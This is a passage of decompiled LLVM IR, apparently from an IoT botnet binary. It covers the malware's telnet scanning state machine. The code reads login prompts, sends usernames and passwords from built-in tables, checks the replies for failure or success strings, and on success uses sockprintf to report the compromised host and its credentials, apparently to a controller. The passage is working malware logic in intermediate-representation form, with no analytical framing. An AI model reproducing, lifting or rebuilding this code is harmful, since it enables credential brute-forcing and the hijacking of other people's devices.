  %v3_d340 = udiv i32 %v2_d33c, 32
  %v3_d354 = mul nuw nsw i32 %v3_d340, 4
  %v2_d35c = add i32 %v3_d354, %v19_cba0
  store i32 %v2_d35c, i32* %r2.global-to-local, align 4
  %v2_d360 = add i32 %v2_d35c, -300
  store i32 %v2_d360, i32* %r3.global-to-local, align 4
  %v1_d364 = inttoptr i32 %v2_d360 to i32*
  %v2_d364 = load i32, i32* %v1_d364, align 4
  store i32 %v2_d364, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d380 = load i32, i32* %v1_d33c, align 4
  %v1_d384 = urem i32 %v2_d380, 32
  %v6_d38c = shl i32 1, %v1_d384
  %v2_d390 = or i32 %v6_d38c, %v2_d364
  store i32 %v2_d390, i32* %v1_d364, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d3d8 = load i32, i32* %v1_d33c, align 4
  %v1_d3dc = add i32 %v2_d3d8, 1
  store i32 %v1_d3dc, i32* %r2.global-to-local, align 4
  store i32 %v2_d2e8, i32* %ip.global-to-local, align 4
  %v1_d3e8 = load i32, i32* @sp, align 4
  %v2_d3e8 = inttoptr i32 %v1_d3e8 to i32*
  store i32 %v2_d3e4, i32* %v2_d3e8, align 4
  %v0_d3ec = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_d2e8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_d3fc = load i32, i32* %stack_var_-332, align 4
  %v5_d3fc = call i32 @__libc_select(i32 %v0_d3ec, i32 0, i32 %v2_d2e8, i32 0, i32 %v4_d3fc)
  store i32 %v5_d3fc, i32* %r3.global-to-local, align 4
  %v7_d40c = icmp eq i32 %v5_d3fc, 1
  br i1 %v7_d40c, label %dec_label_pc_d414, label %dec_label_pc_d518

dec_label_pc_d414:                                ; preds = %dec_label_pc_d324
  store i32 4, i32* %stack_var_-336, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d43c = load i32, i32* %v1_d33c, align 4
  store i32 %v2_d43c, i32* %r2.global-to-local, align 4
  store i32 %v2_d440, i32* %ip.global-to-local, align 4
  %v1_d448 = load i32, i32* @sp, align 4
  %v2_d448 = inttoptr i32 %v1_d448 to i32*
  store i32 %v2_d444, i32* %v2_d448, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_d440, i32* %r3.global-to-local, align 4
  %v0_d45c = call i32 @getsockopt()
  %v3_d460 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_d460, i32* %r3.global-to-local, align 4
  %v2_d464 = icmp eq i32 %v3_d460, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  br i1 %v2_d464, label %dec_label_pc_d490, label %dec_label_pc_d46c

dec_label_pc_d46c:                                ; preds = %dec_label_pc_d414
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d488 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d490:                                ; preds = %dec_label_pc_d414
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d4a8 = load i32, i32* %v1_d33c, align 4
  store i32 %v2_d4a8, i32* @r4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d4c4 = load i32, i32* %v1_d33c, align 4
  store i32 %v2_d4c4, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_d4d4 = call i32 @__libc_fcntl(i32 %v2_d4c4, i32 3)
  %v1_d4dc = and i32 %v2_d4d4, -2049
  store i32 %v1_d4dc, i32* %r3.global-to-local, align 4
  %v0_d4e0 = load i32, i32* @r4, align 4
  store i32 %v1_d4dc, i32* @r2, align 4
  %v2_d4ec = call i32 @__libc_fcntl(i32 %v0_d4e0, i32 4)
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d510 = call i32 @advance_state(i32* nonnull %v1_d33c, i32 2)
  br label %dec_label_pc_df5c

dec_label_pc_d518:                                ; preds = %dec_label_pc_d324
  store i32 %v5_d3fc, i32* %r3.global-to-local, align 4
  %v3_d51c = icmp eq i32 %v5_d3fc, -1
  br i1 %v3_d51c, label %dec_label_pc_d524, label %dec_label_pc_d548

dec_label_pc_d524:                                ; preds = %dec_label_pc_d518
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d540 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d548:                                ; preds = %dec_label_pc_d518
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d564 = add i32 %v2_cdec, %v2_d560
  store i32 %v2_d564, i32* %r3.global-to-local, align 4
  %v1_d568 = inttoptr i32 %v2_d564 to i32*
  %v2_d568 = load i32, i32* %v1_d568, align 4
  store i32 %v2_d568, i32* %r3.global-to-local, align 4
  %v1_d56c = add i32 %v2_d568, 5
  store i32 %v1_d56c, i32* @r4, align 4
  %v2_d574 = call i32 @__GI_time(i32* null)
  store i32 %v2_d574, i32* %r3.global-to-local, align 4
  %v0_d57c = load i32, i32* @r4, align 4
  %v3_d57c = icmp ult i32 %v0_d57c, %v2_d574
  br i1 %v3_d57c, label %dec_label_pc_d584, label %dec_label_pc_df5c

dec_label_pc_d584:                                ; preds = %dec_label_pc_d548
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d5a0 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d5a8:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d5c0 = inttoptr i32 %v2_cdf0 to i32*
  %v2_d5c0 = load i32, i32* %v1_d5c0, align 4
  store i32 %v2_d5c0, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d5e0 = add i32 %v2_cdec, %v2_d5dc
  store i32 %v2_d5e0, i32* %r3.global-to-local, align 4
  %v1_d5e4 = inttoptr i32 %v2_d5e0 to i32*
  %v2_d5e4 = load i32, i32* %v1_d5e4, align 4
  store i32 %v2_d5e4, i32* %r2.global-to-local, align 4
  %v1_d5ec = load i32, i32* @sp, align 4
  %v2_d5ec = inttoptr i32 %v1_d5ec to i32*
  store i32 ptrtoint (i32* @global_var_2c4d0 to i32), i32* %v2_d5ec, align 4
  %v0_d5f0 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_d5fc = inttoptr i32 %v2_d5e4 to i8*
  %v5_d5fc = call i32 @read_until_response(i32 %v0_d5f0, i32 %arg1, i8* %v4_d5fc, i32 1024)
  %v2_d604 = icmp eq i32 %v5_d5fc, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_d604, label %dec_label_pc_d694, label %dec_label_pc_d60c

dec_label_pc_d60c:                                ; preds = %dec_label_pc_d5a8
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d628 = add i32 %v2_cdf0, 24
  store i32 %v2_d628, i32* %r3.global-to-local, align 4
  %v1_d62c = inttoptr i32 %v2_d628 to i32*
  %v2_d62c = load i32, i32* %v1_d62c, align 4
  store i32 %v2_d62c, i32* %r3.global-to-local, align 4
  %v1_d634 = call i32 @contains_fail(i32 %v2_d62c)
  %v2_d63c = icmp eq i32 %v1_d634, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v2_d63c, label %dec_label_pc_d66c, label %dec_label_pc_d644

dec_label_pc_d644:                                ; preds = %dec_label_pc_d60c
  %v3_d664 = call i32 @advance_state(i32* %v1_d5c0, i32 0)
  br label %dec_label_pc_df5c

dec_label_pc_d66c:                                ; preds = %dec_label_pc_d60c
  %v3_d68c = call i32 @advance_state(i32* %v1_d5c0, i32 3)
  br label %dec_label_pc_df5c

dec_label_pc_d694:                                ; preds = %dec_label_pc_d5a8
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf4, i32* %r3.global-to-local, align 4
  %v2_d6b4 = load i32, i32* %v1_cdf8, align 4
  store i32 %v2_d6b4, i32* %r3.global-to-local, align 4
  %v1_d6b8 = add i32 %v2_d6b4, 7
  store i32 %v1_d6b8, i32* @r4, align 4
  %v2_d6c0 = call i32 @__GI_time(i32* null)
  store i32 %v2_d6c0, i32* %r3.global-to-local, align 4
  %v0_d6c8 = load i32, i32* @r4, align 4
  %v3_d6c8 = icmp ult i32 %v0_d6c8, %v2_d6c0
  br i1 %v3_d6c8, label %dec_label_pc_d6d0, label %dec_label_pc_df5c

dec_label_pc_d6d0:                                ; preds = %dec_label_pc_d694
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d6ec = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d6f4:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d70c = inttoptr i32 %v2_cdf0 to i32*
  %v2_d70c = load i32, i32* %v1_d70c, align 4
  store i32 %v2_d70c, i32* @r4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d72c = add i32 %v2_cdf0, 8
  store i32 %v2_d72c, i32* %r3.global-to-local, align 4
  %v1_d730 = add i32 %v2_cdf0, 10
  %v2_d730 = inttoptr i32 %v1_d730 to i8*
  %v3_d730 = load i8, i8* %v2_d730, align 2
  %v4_d730 = zext i8 %v3_d730 to i32
  store i32 %v4_d730, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8*]* @global_var_2c48c.338 to i32), i32* %r3.global-to-local, align 4
  %v4_d73c = mul nuw nsw i32 %v4_d730, 4
  %v5_d73c = add i32 %v4_d73c, ptrtoint ([6 x i8*]* @global_var_2c48c.338 to i32)
  %v6_d73c = inttoptr i32 %v5_d73c to i32*
  %v7_d73c = load i32, i32* %v6_d73c, align 4
  store i32 %v7_d73c, i32* @r5, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_d72c, i32* %r3.global-to-local, align 4
  %v3_d760 = load i8, i8* %v2_d730, align 2
  %v4_d760 = zext i8 %v3_d760 to i32
  store i32 %v4_d760, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8*]* @global_var_2c48c.338 to i32), i32* %r3.global-to-local, align 4
  %v4_d76c = mul nuw nsw i32 %v4_d760, 4
  %v5_d76c = add i32 %v4_d76c, ptrtoint ([6 x i8*]* @global_var_2c48c.338 to i32)
  %v6_d76c = inttoptr i32 %v5_d76c to i32*
  %v7_d76c = load i32, i32* %v6_d76c, align 4
  store i32 %v7_d76c, i32* %r3.global-to-local, align 4
  %v1_d770 = inttoptr i32 %v7_d76c to i8*
  %v3_d774 = call i32 @strlen(i8* %v1_d770)
  %v0_d77c = load i32, i32* @r4, align 4
  %v0_d780 = load i32, i32* @r5, align 4
  store i32 %v3_d774, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_d78c = inttoptr i32 %v0_d780 to i32*
  %v5_d78c = call i32 @__libc_send(i32 %v0_d77c, i32* %v4_d78c, i32 %v3_d774, i32 16384)
  %v1_d794 = icmp slt i32 %v5_d78c, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v1_d794, label %dec_label_pc_d79c, label %dec_label_pc_d7c0

dec_label_pc_d79c:                                ; preds = %dec_label_pc_d6f4
  %v3_d7b8 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d7c0:                                ; preds = %dec_label_pc_d6f4
  %v2_d7d8 = load i32, i32* %v1_d70c, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_d7ec = call i32 @__libc_send(i32 %v2_d7d8, i32* bitcast ([3 x i8]* @global_var_1adb8.340 to i32*), i32 2, i32 16384)
  %v1_d7f4 = icmp slt i32 %v6_d7ec, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v1_d7f4, label %dec_label_pc_d7fc, label %dec_label_pc_d820

dec_label_pc_d7fc:                                ; preds = %dec_label_pc_d7c0
  %v3_d818 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d820:                                ; preds = %dec_label_pc_d7c0
  %v3_d840 = call i32 @advance_state(i32* nonnull %v1_d70c, i32 4)
  br label %dec_label_pc_df5c

dec_label_pc_d848:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d860 = inttoptr i32 %v2_cdf0 to i32*
  %v2_d860 = load i32, i32* %v1_d860, align 4
  store i32 %v2_d860, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d880 = add i32 %v2_cdec, %v2_d5dc
  store i32 %v2_d880, i32* %r3.global-to-local, align 4
  %v1_d884 = inttoptr i32 %v2_d880 to i32*
  %v2_d884 = load i32, i32* %v1_d884, align 4
  store i32 %v2_d884, i32* %r2.global-to-local, align 4
  %v1_d88c = load i32, i32* @sp, align 4
  %v2_d88c = inttoptr i32 %v1_d88c to i32*
  store i32 ptrtoint (i32* @global_var_2c4d0 to i32), i32* %v2_d88c, align 4
  %v0_d890 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_d89c = inttoptr i32 %v2_d884 to i8*
  %v5_d89c = call i32 @read_until_response(i32 %v0_d890, i32 %arg1, i8* %v4_d89c, i32 1024)
  %v2_d8a4 = icmp eq i32 %v5_d89c, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_d8a4, label %dec_label_pc_d934, label %dec_label_pc_d8ac

dec_label_pc_d8ac:                                ; preds = %dec_label_pc_d848
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d8c8 = add i32 %v2_cdf0, 24
  store i32 %v2_d8c8, i32* %r3.global-to-local, align 4
  %v1_d8cc = inttoptr i32 %v2_d8c8 to i32*
  %v2_d8cc = load i32, i32* %v1_d8cc, align 4
  store i32 %v2_d8cc, i32* %r3.global-to-local, align 4
  %v1_d8d4 = call i32 @contains_fail(i32 %v2_d8cc)
  %v2_d8dc = icmp eq i32 %v1_d8d4, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v2_d8dc, label %dec_label_pc_d90c, label %dec_label_pc_d8e4

dec_label_pc_d8e4:                                ; preds = %dec_label_pc_d8ac
  %v3_d904 = call i32 @advance_state(i32* %v1_d860, i32 0)
  br label %dec_label_pc_df5c

dec_label_pc_d90c:                                ; preds = %dec_label_pc_d8ac
  %v3_d92c = call i32 @advance_state(i32* %v1_d860, i32 5)
  br label %dec_label_pc_df5c

dec_label_pc_d934:                                ; preds = %dec_label_pc_d848
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf4, i32* %r3.global-to-local, align 4
  %v2_d954 = load i32, i32* %v1_cdf8, align 4
  store i32 %v2_d954, i32* %r3.global-to-local, align 4
  %v1_d958 = add i32 %v2_d954, 3
  store i32 %v1_d958, i32* @r4, align 4
  %v2_d960 = call i32 @__GI_time(i32* null)
  store i32 %v2_d960, i32* %r3.global-to-local, align 4
  %v0_d968 = load i32, i32* @r4, align 4
  %v3_d968 = icmp ult i32 %v0_d968, %v2_d960
  br i1 %v3_d968, label %dec_label_pc_d970, label %dec_label_pc_df5c

dec_label_pc_d970:                                ; preds = %dec_label_pc_d934
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d98c = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d994:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d9ac = inttoptr i32 %v2_cdf0 to i32*
  %v2_d9ac = load i32, i32* %v1_d9ac, align 4
  store i32 %v2_d9ac, i32* @r4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d9cc = add i32 %v2_cdf0, 8
  store i32 %v2_d9cc, i32* %r3.global-to-local, align 4
  %v1_d9d0 = add i32 %v2_cdf0, 11
  %v2_d9d0 = inttoptr i32 %v1_d9d0 to i8*
  %v3_d9d0 = load i8, i8* %v2_d9d0, align 1
  %v4_d9d0 = zext i8 %v3_d9d0 to i32
  store i32 %v4_d9d0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8*]* @global_var_2c498.342 to i32), i32* %r3.global-to-local, align 4
  %v4_d9dc = mul nuw nsw i32 %v4_d9d0, 4
  %v5_d9dc = add i32 %v4_d9dc, ptrtoint ([3 x i8*]* @global_var_2c498.342 to i32)
  %v6_d9dc = inttoptr i32 %v5_d9dc to i32*
  %v7_d9dc = load i32, i32* %v6_d9dc, align 4
  store i32 %v7_d9dc, i32* @r5, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_d9cc, i32* %r3.global-to-local, align 4
  %v3_da00 = load i8, i8* %v2_d9d0, align 1
  %v4_da00 = zext i8 %v3_da00 to i32
  store i32 %v4_da00, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8*]* @global_var_2c498.342 to i32), i32* %r3.global-to-local, align 4
  %v4_da0c = mul nuw nsw i32 %v4_da00, 4
  %v5_da0c = add i32 %v4_da0c, ptrtoint ([3 x i8*]* @global_var_2c498.342 to i32)
  %v6_da0c = inttoptr i32 %v5_da0c to i32*
  %v7_da0c = load i32, i32* %v6_da0c, align 4
  store i32 %v7_da0c, i32* %r3.global-to-local, align 4
  %v1_da10 = inttoptr i32 %v7_da0c to i8*
  %v3_da14 = call i32 @strlen(i8* %v1_da10)
  %v0_da1c = load i32, i32* @r4, align 4
  %v0_da20 = load i32, i32* @r5, align 4
  store i32 %v3_da14, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_da2c = inttoptr i32 %v0_da20 to i32*
  %v5_da2c = call i32 @__libc_send(i32 %v0_da1c, i32* %v4_da2c, i32 %v3_da14, i32 16384)
  %v1_da34 = icmp slt i32 %v5_da2c, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v1_da34, label %dec_label_pc_da3c, label %dec_label_pc_da60

dec_label_pc_da3c:                                ; preds = %dec_label_pc_d994
  %v3_da58 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_da60:                                ; preds = %dec_label_pc_d994
  %v2_da78 = load i32, i32* %v1_d9ac, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_da8c = call i32 @__libc_send(i32 %v2_da78, i32* bitcast ([3 x i8]* @global_var_1adb8.340 to i32*), i32 2, i32 16384)
  %v1_da94 = icmp slt i32 %v6_da8c, 0
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v1_da94, label %dec_label_pc_da9c, label %dec_label_pc_dac0

dec_label_pc_da9c:                                ; preds = %dec_label_pc_da60
  %v3_dab8 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_dac0:                                ; preds = %dec_label_pc_da60
  %v3_dae0 = call i32 @advance_state(i32* nonnull %v1_d9ac, i32 6)
  br label %dec_label_pc_df5c

dec_label_pc_dae8:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_db00 = inttoptr i32 %v2_cdf0 to i32*
  %v2_db00 = load i32, i32* %v1_db00, align 4
  store i32 %v2_db00, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_db20 = add i32 %v2_cdec, %v2_d5dc
  store i32 %v2_db20, i32* %r3.global-to-local, align 4
  %v1_db24 = inttoptr i32 %v2_db20 to i32*
  %v2_db24 = load i32, i32* %v1_db24, align 4
  store i32 %v2_db24, i32* %r2.global-to-local, align 4
  %v1_db2c = load i32, i32* @sp, align 4
  %v2_db2c = inttoptr i32 %v1_db2c to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_2c514.344 to i32), i32* %v2_db2c, align 4
  %v0_db30 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_db3c = inttoptr i32 %v2_db24 to i8*
  %v5_db3c = call i32 @read_until_response(i32 %v0_db30, i32 %arg1, i8* %v4_db3c, i32 1024)
  store i32 %v5_db3c, i32* %r3.global-to-local, align 4
  %v2_db44 = icmp eq i32 %v5_db3c, 0
  br i1 %v2_db44, label %dec_label_pc_dd8c, label %dec_label_pc_db4c

dec_label_pc_db4c:                                ; preds = %dec_label_pc_dae8
  store i32 %storemerge553, i32* @r4, align 4
  %v2_db54 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_db68 = load i32, i32* @r4, align 4
  %v2_db74 = mul i32 %v0_db68, 28
  %v2_db7c = add i32 %v2_d560, %v2_db74
  %v2_db80 = inttoptr i32 %v2_db7c to i32*
  store i32 %v2_db54, i32* %v2_db80, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_db20, i32* %r3.global-to-local, align 4
  %v2_dba4 = load i32, i32* %v1_db24, align 4
  store i32 %v2_dba4, i32* %r3.global-to-local, align 4
  %v1_dbac = call i32 @contains_fail(i32 %v2_dba4)
  store i32 %v1_dbac, i32* %r3.global-to-local, align 4
  %v2_dbb4 = icmp eq i32 %v1_dbac, 0
  br i1 %v2_dbb4, label %dec_label_pc_dbe4, label %dec_label_pc_dbbc

dec_label_pc_dbbc:                                ; preds = %dec_label_pc_db4c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dbdc = call i32 @advance_state(i32* %v1_db00, i32 0)
  br label %dec_label_pc_df5c

dec_label_pc_dbe4:                                ; preds = %dec_label_pc_db4c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_db20, i32* %r3.global-to-local, align 4
  %v2_dc04 = load i32, i32* %v1_db24, align 4
  store i32 %v2_dc04, i32* %r3.global-to-local, align 4
  %v1_dc0c = call i32 @contains_success(i32 %v2_dc04)
  store i32 %v1_dc0c, i32* %r3.global-to-local, align 4
  %v2_dc14 = icmp eq i32 %v1_dc0c, 0
  br i1 %v2_dc14, label %dec_label_pc_dd3c, label %dec_label_pc_dc1c

dec_label_pc_dc1c:                                ; preds = %dec_label_pc_dbe4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_dc38 = add i32 %v2_cdf0, 8
  store i32 %v2_dc38, i32* %r3.global-to-local, align 4
  %v1_dc3c = add i32 %v2_cdf0, 9
  %v2_dc3c = inttoptr i32 %v1_dc3c to i8*
  %v3_dc3c = load i8, i8* %v2_dc3c, align 1
  %v4_dc3c = zext i8 %v3_dc3c to i32
  store i32 %v4_dc3c, i32* %r3.global-to-local, align 4
  %v7_dc40 = icmp eq i8 %v3_dc3c, 2
  br i1 %v7_dc40, label %dec_label_pc_dc48, label %dec_label_pc_dc70

dec_label_pc_dc48:                                ; preds = %dec_label_pc_dc1c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dc68 = call i32 @advance_state(i32* %v1_db00, i32 7)
  br label %dec_label_pc_df5c

dec_label_pc_dc70:                                ; preds = %dec_label_pc_dc1c
  %v2_dc74 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_dc74, i32* @r4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dc94 = call i32 @get_telstate_host(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  store i32 %v3_dc94, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_dc38, i32* %r3.global-to-local, align 4
  %v1_dcbc = add i32 %v2_cdf0, 10
  %v2_dcbc = inttoptr i32 %v1_dcbc to i8*
  %v3_dcbc = load i8, i8* %v2_dcbc, align 2
  %v4_dcbc = zext i8 %v3_dcbc to i32
  store i32 %v4_dcbc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8*]* @global_var_2c48c.338 to i32), i32* %r3.global-to-local, align 4
  %v4_dcc8 = mul nuw nsw i32 %v4_dcbc, 4
  %v5_dcc8 = add i32 %v4_dcc8, ptrtoint ([6 x i8*]* @global_var_2c48c.338 to i32)
  %v6_dcc8 = inttoptr i32 %v5_dcc8 to i32*
  %v7_dcc8 = load i32, i32* %v6_dcc8, align 4
  store i32 %v7_dcc8, i32* @lr, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_dc38, i32* %r3.global-to-local, align 4
  %v1_dcec = add i32 %v2_cdf0, 11
  %v2_dcec = inttoptr i32 %v1_dcec to i8*
  %v3_dcec = load i8, i8* %v2_dcec, align 1
  %v4_dcec = zext i8 %v3_dcec to i32
  store i32 %v4_dcec, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8*]* @global_var_2c498.342 to i32), i32* %r3.global-to-local, align 4
  %v4_dcf8 = mul nuw nsw i32 %v4_dcec, 4
  %v5_dcf8 = add i32 %v4_dcf8, ptrtoint ([3 x i8*]* @global_var_2c498.342 to i32)
  %v6_dcf8 = inttoptr i32 %v5_dcf8 to i32*
  %v7_dcf8 = load i32, i32* %v6_dcf8, align 4
  %v1_dcfc = load i32, i32* @sp, align 4
  %v2_dcfc = inttoptr i32 %v1_dcfc to i32*
  store i32 %v7_dcf8, i32* %v2_dcfc, align 4
  %v0_dd00 = load i32, i32* @r4, align 4
  %v0_dd08 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_dd08, i32* @r2, align 4
  %v0_dd0c = load i32, i32* @lr, align 4
  store i32 %v0_dd0c, i32* %r3.global-to-local, align 4
  %v3_dd10 = call i32 @sockprintf(i32 %v0_dd00, i32 ptrtoint ([23 x i8]* @global_var_1adbc.347 to i32))
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dd34 = call i32 @advance_state(i32* %v1_db00, i32 7)
  br label %dec_label_pc_df5c

dec_label_pc_dd3c:                                ; preds = %dec_label_pc_dbe4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dd58 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_dd8c:                                ; preds = %dec_label_pc_dae8
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_dda8 = add i32 %v2_cdec, %v2_d560
  store i32 %v2_dda8, i32* %r3.global-to-local, align 4
  %v1_ddac = inttoptr i32 %v2_dda8 to i32*
  %v2_ddac = load i32, i32* %v1_ddac, align 4
  store i32 %v2_ddac, i32* %r3.global-to-local, align 4
  %v1_ddb0 = add i32 %v2_ddac, 7
  store i32 %v1_ddb0, i32* @r4, align 4
  %v2_ddb8 = call i32 @__GI_time(i32* null)
  store i32 %v2_ddb8, i32* %r3.global-to-local, align 4
  %v0_ddc0 = load i32, i32* @r4, align 4
  %v3_ddc0 = icmp ult i32 %v0_ddc0, %v2_ddb8
  br i1 %v3_ddc0, label %dec_label_pc_ddc8, label %dec_label_pc_df5c

dec_label_pc_ddc8:                                ; preds = %dec_label_pc_dd8c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dde4 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

